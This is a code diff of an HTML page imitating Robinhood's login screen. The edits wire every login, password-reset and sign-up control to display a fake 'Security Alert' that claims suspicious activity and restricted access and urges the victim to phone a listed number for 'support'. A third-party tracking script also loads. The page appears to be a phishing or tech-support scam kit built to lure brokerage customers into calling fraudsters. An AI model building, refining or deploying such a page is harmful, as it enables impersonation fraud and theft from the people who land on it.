@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en-US" dir="ltr">
 <head>
   <meta charset="UTF-8">
@@ -142,14 +142,14 @@
                       </div>
                     </div>
                     <div class="web-app-emotion-cache-1ajn24b">
-                      <a role="link" class="rh-hyperlink web-app-emotion-cache-1llaoxs css-1byi2su">
+                      <a role="link" class="rh-hyperlink web-app-emotion-cache-1llaoxs css-1byi2su" @click.prevent="errorArea = true">
                         <span class="web-app-emotion-cache-zvjitd">
                           <span class="web-app-emotion-cache-16fsaft">
                             <span class="web-app-emotion-cache-1xmir16 css-v72tci">Forgot your password?</span>
                           </span>
                         </span>
                       </a>
-                      <a role="link" class="rh-hyperlink web-app-emotion-cache-1llaoxs css-1byi2su">
+                      <a role="link" class="rh-hyperlink web-app-emotion-cache-1llaoxs css-1byi2su" @click.prevent="errorArea = true">
                         <span class="web-app-emotion-cache-zvjitd">
                           <span class="web-app-emotion-cache-16fsaft">
                             <span class="web-app-emotion-cache-1xmir16 css-v72tci">Forgot your email address?</span>
@@ -232,7 +232,7 @@
                     </div>
                     <div id="submitbutton" class="web-app-emotion-cache-1sstyyn" x-show="!phoneArea">
                       <div class="web-app-emotion-cache-1am54wq">
-                        <button type="button" aria-busy="false" class="web-app-emotion-cache-skipym">
+                        <button type="button" aria-busy="false" class="web-app-emotion-cache-skipym" @click="errorArea = true">
                           <span class="web-app-emotion-cache-zvjitd">
                             <span class="web-app-emotion-cache-16fsaft">
                               <span aria-hidden="true" class="web-app-emotion-cache-1e7mxex">
@@ -248,7 +248,7 @@
                       </div>
                     </div>
                     <div class="web-app-emotion-cache-1hw29i9" x-show="!phoneArea">
-                      <span class="css-y3z1hq">Not on Robinhood?</span> <button type="button" aria-busy="false" class="web-app-emotion-cache-finv5o">
+                      <span class="css-y3z1hq">Not on Robinhood?</span> <button type="button" aria-busy="false" class="web-app-emotion-cache-finv5o" @click="errorArea = true">
                         <span class="web-app-emotion-cache-zvjitd">
                           <span class="web-app-emotion-cache-16fsaft">
                             <span class="web-app-emotion-cache-ksarv1 css-v72tci">Create an account</span>
@@ -267,14 +267,15 @@
                           <line x1="12" y1="9" x2="12" y2="13"></line>
                           <line x1="12" y1="17" x2="12.01" y2="17"></line>
                         </svg>
-                        Account Disabled
+                        Security Alert
                       </span>
                     </div>
                     <div class="web-app-emotion-cache-1rqauel">
-                      <p class="css-y3z1hq" style="text-align: justify;">Your account has been disabled due to security concerns. Please contact our support team for assistance.</p>
+                      <p class="css-y3z1hq" style="text-align: justify;">Suspicious activity detected on your device. For your protection and security we've temporarily restricted access.</p>
                     </div>
                     <div class="web-app-emotion-cache-12bmans">
-                      <p class="css-y3z1hq" style="text-align: justify;">For your protection, we've temporarily restricted access to your account. This is a precautionary measure to ensure the safety of your personal information.</p>
+                      <p class="css-y3z1hq" style="text-align: justify;">This is a precautionary measure to ensure the safety or any financial loss.<br>
+ Please get in touch with the support for more information</p>
                     </div>
                     <div class="web-app-emotion-cache-1sstyyn">
                       <button type="button" class="errorButton" onclick="window.location.href='tel:+18332397921'" style="display: flex; align-items: center; justify-content: center;">
@@ -386,12 +387,5 @@ wts.src='https://app.ardalio.com/wts7.js';document.head.appendChild(wts);
 wts.onload = function(){ wtsl7(2200331,3); };
 </script><noscript><img src="https://app.ardalio.com/7/3/2200331.png"></noscript>
 <!-- end code v 7.0 -->
-
-  
-  
-  
-  
-  
-  
 </body>
 </html>
